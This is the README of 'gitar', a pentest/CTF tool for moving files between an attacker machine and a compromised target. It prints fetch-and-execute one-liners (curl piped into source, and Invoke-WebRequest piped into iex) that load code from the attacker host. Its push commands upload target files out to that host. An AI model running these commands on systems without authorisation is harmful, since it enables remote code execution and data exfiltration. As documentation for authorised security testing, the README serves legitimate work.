<div align=center>
<h1>gitar</h1>
<img src=https://github.com/ariary/gitar/blob/main/img/gitar-logo.png width=150>
	
<strong>📡 A more sophisticated python HTTP server sibling <br>🎸 focusing on having the simplest interactions for file exchange (Pentest/CTF)<br>🎵 with additional functionality: <a href=#webhook-mode>HTTP webhook logging</a> </strong>
<br>
</div>

|![demo](https://github.com/ariary/gitar/blob/main/img/gitar-screen.png)|
|:---:|
|**~>** Have the  ***simplest possible shortcuts*** to upload/download file to/from the target machine<br>**~>** ***No installation needed*** on target machine<br>**~>** ***Fast and simple*** deployment|



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** from my attacker machine: `pull [file]` *(with filename completion)*
 - **Download a directory** from my attacker machine: `pullr [directory]`
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a directory** to my attacker machine: `pushr [directory]`

*Before being able to use these shortcuts you have to [set up](#set-up) both machines. Once again, the aim is to make it as simple as possible*

## Set up


### 🎸 Launch `gitar` server 
 
On **Attacker machine**: 
```shell
gitar
```

On **Target machine** (Linux/macOS):

```shell
# Get shortcuts and source them. The one-liner is copied to clipboard by default
# and printed by gitar at startup:
source <(curl -s http://[attacker_ip:port]/alias)
```

On **Target machine** (Windows — PowerShell):

```powershell
(Invoke-WebRequest http://[attacker_ip:port]/aliaswinps).Content | iex
```

**And that's all, you can now `push`, `pull`, `pushr` or `pullr` [🎶](#tldr---and-listen-music)**

 <sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)</sup>

### 🐋 Secure launch of `gitar` server

Same as above but inside a container with HTTPS, so you are not the prey while being the predator.

On **Attacker machine**: 
```shell
docker run -it --rm --net host --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" ariary/gitar
```

<sup>[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)</sup>

### Pre-requisites

* HTTP network connectivity between attacker & target machines
* On target machine:
  * Linux/macOS: `curl`, `tar` (for directory upload/download)
  * Windows: `curl` or PowerShell (built-in); `Compress-Archive` built-in — no extra tools needed
* On attacker machine: 
	* `xclip` to copy command to clipboard (not required)
	* `tree`: to expose it through server (not required)
	* `dig`: to automatically find external IP (not required)

## Additional Functionalities

### `webhook` mode

Use this mode to observe and log incoming HTTP requests:
* Log request information (parameters, headers, body)
* Override response headers
* Forward to another HTTP server (reverse proxy / local logging middleware)
* Serve a directory alongside

```shell
# log incoming request and retrieve payload parameter value
gitar webhook -P payload
```

### `send` mode

<details>
<summary>Quick file sending via SCP (click to expand)</summary>

Send files directly to a target without remembering the full command. Uses a prompt for missing fields and remembers the last configuration with `-l`.

```shell
# send /img folder using scp with user root to target.com
gitar send scp -t target.com -u root /img
# reuse previous settings
gitar send scp -l exploit.sh
```

</details>

## Install

```shell
go install github.com/ariary/gitar@latest
```

## Bonus
- [Bidirectional exchange](./BONUS.md#bidirectional-exchange)
  - [🐋 Container and bidirectional exchange](./BONUS.md#-container-and-bidirectional-exchange)
- [Multiplexing & Port forwarding](./BONUS.md#multiplexing--port-forwarding)
- [Load shortcut directly in your bind shell](./BONUS.md#load-shortcut-directly-in-your-bind-shell)
